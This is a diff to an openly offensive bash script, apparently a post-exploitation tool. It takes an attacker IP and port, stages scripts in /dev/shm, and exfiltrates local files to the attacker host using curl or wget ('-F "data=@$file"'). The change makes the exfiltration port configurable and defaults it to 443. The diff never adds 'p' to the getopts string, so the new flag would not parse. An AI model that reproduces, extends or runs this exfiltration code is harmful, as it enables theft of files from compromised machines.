@@ -4,8 +4,9 @@ usage()
 { 
 		echo "USAGE:"
 		echo "-i	Attacker IP/Host"
+		echo "-p	Attacker Port"
 		echo "-u	Local User to Check"
-		echo "-d 	Specify Path To Local wget/curl downloader"	
+		echo "-d 	Specify Path To Local wget/curl downloader"
 }
 
 setdload()
@@ -33,6 +34,11 @@ prep()
 	if [ -z "$ip" ] ; then
 		echo "Host Required. Exiting."
 		exit
+	fi
+	
+	# Check if port is supplied else default to 443
+	if [ -z "$port" ] ; then
+		port=443
 	fi
 	
 	# Check /dev/shm is available for storing and running scripts
@@ -162,7 +168,7 @@ exfiltrate()
 		for file in "${files[@]}"
 		do
 			echo -e "\n#### Exfiltrating: $file ####\n" 
-			$dload -F "data=@$file" $1:443
+			$dload -F "data=@$file" $1:$port
 		done
 	else
 		echo -e "\n### Command not specified. Exfiltrate manually ###\n"
@@ -183,6 +189,7 @@ run()
 while getopts "h:i:u:d" option; do
  case "${option}" in
     i) ip=${OPTARG};;
+    p) port=${OPTARG};;
     u) user=${OPTARG};;
     d) dload=${OPTARG};;
     h) usage; exit;;
